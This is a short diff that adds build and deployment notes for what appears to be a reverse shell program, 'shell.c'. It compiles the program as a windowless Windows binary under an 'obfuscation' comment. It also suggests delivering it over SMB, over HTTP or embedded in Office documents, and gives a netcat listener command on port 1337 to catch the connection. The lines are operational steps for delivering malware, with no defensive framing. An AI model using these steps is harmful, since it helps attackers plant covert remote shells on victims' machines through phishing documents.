@@ -1,0 +1,5 @@
+# Compile with obfuscation
+cl.exe /O2 /GL /DNDEBUG shell.c /link /LTCG /SUBSYSTEM:WINDOWS shell.obj
+
+# Deploy via SMB/HTTP/embedded in Office docs
+# Listen: nc -lnvp 1337
